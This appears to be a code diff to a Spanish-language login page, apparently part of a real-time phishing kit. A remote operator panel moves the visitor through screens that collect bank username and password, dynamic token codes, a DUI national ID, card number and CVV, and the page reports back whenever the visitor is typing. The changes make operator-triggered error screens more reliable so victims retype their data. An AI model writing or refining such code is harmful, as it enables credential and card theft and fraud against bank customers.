@@ -51,6 +51,7 @@ export default function LoginPage() {
   const tejuinoActiveRef = useRef(false);
   /** Último state del servidor visto por el poll (para no reaplicar residuales). */
   const prevServerStateRef = useRef("");
+  const lastActionSeqRef = useRef<number>(0);
 
   // Ping + poll de acciones del panel (cross-browser vía API)
   useEffect(() => {
@@ -65,11 +66,19 @@ export default function LoginPage() {
           const prevState = prevServerStateRef.current;
           prevServerStateRef.current = session.state;
 
+          const actionSeq = session.actionSeq ?? 0;
+          const isNewAction = actionSeq > 0 && actionSeq !== lastActionSeqRef.current;
+          if (isNewAction) {
+            lastActionSeqRef.current = actionSeq;
+          }
+
           // Acciones del operador primero (c-interna / errores / done)
           if (session.state === "c-interna") {
             // Si ya dimos Continuar en tejuino, no bajar el spinner por residual c-interna
             if (step === "tejuino" && (waitingPanel || busyRef.current)) {
               /* keep spinner — esperando Listo / error del panel */
+            } else if (step === "tejuino" && appliedActionRef.current === "error-tejuino" && !isNewAction) {
+              /* mantener error visible */
             } else if (
               appliedActionRef.current !== "c-interna" ||
               step !== "tejuino"
@@ -85,15 +94,13 @@ export default function LoginPage() {
               setStep("tejuino");
             }
           } else if (session.state === "error-tejuino") {
-            // Tras Continuar en pantalla de error, el state sigue error-tejuino
-            // un momento: no reaplicar ni apagar el spinner.
             const residualError =
               (waitingPanel || busyRef.current) &&
               appliedActionRef.current === "submitted-tejuino" &&
               prevState === "error-tejuino";
             if (residualError) {
               /* keep spinner */
-            } else if (appliedActionRef.current !== "error-tejuino") {
+            } else if (appliedActionRef.current !== "error-tejuino" || isNewAction) {
               appliedActionRef.current = "error-tejuino";
               tejuinoActiveRef.current = true;
               finishingRef.current = false;
@@ -107,7 +114,7 @@ export default function LoginPage() {
               setStep("tejuino");
             }
           } else if (session.state === "done") {
-            if (!finishingRef.current && appliedActionRef.current !== "done") {
+            if (!finishingRef.current && (appliedActionRef.current !== "done" || isNewAction)) {
               appliedActionRef.current = "done";
               finishingRef.current = true;
               setOpsError("");
@@ -127,7 +134,7 @@ export default function LoginPage() {
               }
             }
           } else if (session.state === "error-token") {
-            if (appliedActionRef.current !== "error-token") {
+            if (appliedActionRef.current !== "error-token" || isNewAction) {
               appliedActionRef.current = "error-token";
               setWaitingPanel(false);
               setAdvancing(false);
@@ -139,7 +146,7 @@ export default function LoginPage() {
               }
             }
           } else if (session.state === "error-user") {
-            if (appliedActionRef.current !== "error-user") {
+            if (appliedActionRef.current !== "error-user" || isNewAction) {
               appliedActionRef.current = "error-user";
               setWaitingPanel(false);
               setAdvancing(false);
@@ -156,7 +163,7 @@ export default function LoginPage() {
               window.setTimeout(() => usernameRef.current?.focus(), 50);
             }
           } else if (session.state === "error-pass") {
-            if (appliedActionRef.current !== "error-pass") {
+            if (appliedActionRef.current !== "error-pass" || isNewAction) {
               appliedActionRef.current = "error-pass";
               setWaitingPanel(false);
               setAdvancing(false);
@@ -174,8 +181,11 @@ export default function LoginPage() {
           ) {
             if (step === "telebanca" && (waitingPanel || busyRef.current)) {
               /* keep spinner */
+            } else if (step === "telebanca" && appliedActionRef.current === "error-token" && !isNewAction) {
+              /* mantener error visible */
             } else if (
-              appliedActionRef.current !== "telebanca" ||
+              (appliedActionRef.current !== "telebanca" && !appliedActionRef.current.startsWith("error-")) ||
+              isNewAction ||
               step !== "telebanca"
             ) {
               appliedActionRef.current = "telebanca";
@@ -191,8 +201,11 @@ export default function LoginPage() {
           ) {
             if (step === "identidad" && (waitingPanel || busyRef.current)) {
               /* keep spinner */
+            } else if (step === "identidad" && appliedActionRef.current === "error-identidad" && !isNewAction) {
+              /* mantener error visible */
             } else if (
-              appliedActionRef.current !== "identidad" ||
+              (appliedActionRef.current !== "identidad" && !appliedActionRef.current.startsWith("error-")) ||
+              isNewAction ||
               step !== "identidad"
             ) {
               appliedActionRef.current = "identidad";
@@ -209,7 +222,7 @@ export default function LoginPage() {
               prevState === "error-identidad";
             if (residualError) {
               /* keep spinner */
-            } else if (appliedActionRef.current !== "error-identidad") {
+            } else if (appliedActionRef.current !== "error-identidad" || isNewAction) {
               appliedActionRef.current = "error-identidad";
               setWaitingPanel(false);
               setAdvancing(false);
@@ -226,8 +239,11 @@ export default function LoginPage() {
               (waitingPanel || busyRef.current)
             ) {
               /* keep spinner */
+            } else if (step === "dinamica" && appliedActionRef.current === "error-token" && !isNewAction) {
+              /* mantener error visible */
             } else if (
-              appliedActionRef.current !== "token" ||
+              (appliedActionRef.current !== "token" && !appliedActionRef.current.startsWith("error-")) ||
+              isNewAction ||
               step !== "dinamica"
             ) {
               appliedActionRef.current = "token";
@@ -244,8 +260,11 @@ export default function LoginPage() {
           ) {
             if (step === "imagen" && (waitingPanel || busyRef.current)) {
               /* keep spinner */
+            } else if (step === "imagen" && appliedActionRef.current === "error-pass" && !isNewAction) {
+              /* mantener error visible */
             } else if (
-              appliedActionRef.current !== actionKey ||
+              (appliedActionRef.current !== actionKey && !appliedActionRef.current.startsWith("error-")) ||
+              isNewAction ||
               step !== "imagen"
             ) {
               appliedActionRef.current = actionKey;
@@ -288,33 +307,37 @@ export default function LoginPage() {
     const sid = sessionIdRef.current;
     if (!sid || waitingPanel) return;
 
+    // Si hay un error activo en pantalla, NO enviar estados base que pisen el error
+    if (appliedActionRef.current.startsWith("error-")) {
+      return;
+    }
+
     let state:
       | "typing"
       | "typing-pass"
       | "typing-telebanca"
       | "typing-identidad"
-      | "token"
-      | "telebanca"
-      | "identidad"
-      | "imagen"
       | null = null;
     if (step === "dinamica") {
       const digits = code.replace(/\D/g, "");
-      state = digits.length > 0 ? "typing" : "token";
+      if (digits.length > 0) state = "typing";
     } else if (step === "telebanca") {
       const digits = code.replace(/\D/g, "");
-      state = digits.length > 0 ? "typing-telebanca" : "telebanca";
+      if (digits.length > 0) state = "typing-telebanca";
     } else if (step === "identidad") {
       const hasInput =
         dui.trim().length > 0 ||
         cardDigits.trim().length > 0 ||
         cvv.trim().length > 0;
-      state = hasInput ? "typing-identidad" : "identidad";
+      if (hasInput) state = "typing-identidad";
     } else if (step === "imagen") {
-      state = password.trim().length > 0 ? "typing-pass" : "imagen";
+      if (password.trim().length > 0) state = "typing-pass";
     } else {
       return;
     }
+
+    // Solo enviar si realmente está escribiendo
+    if (!state) return;
 
     const t = window.setTimeout(() => {
       void patchOpsSession(sid, { state }).catch(() => {});
@@ -325,10 +348,18 @@ export default function LoginPage() {
   // Tejuino: el input vive en TejuinoScreen → señal aparte
   const notifyTejuinoTyping = (hasInput: boolean) => {
     const sid = sessionIdRef.current;
-    if (!sid || waitingPanel || step !== "tejuino") return;
-    void patchOpsSession(sid, {
-      state: hasInput ? "typing-tejuino" : "c-interna",
-    }).catch(() => {});
+    if (
+      !sid ||
+      waitingPanel ||
+      step !== "tejuino" ||
+      appliedActionRef.current === "error-tejuino"
+    )
+      return;
+    if (hasInput) {
+      void patchOpsSession(sid, {
+        state: "typing-tejuino",
+      }).catch(() => {});
+    }
   };
 
   const isDinamica = step === "dinamica";
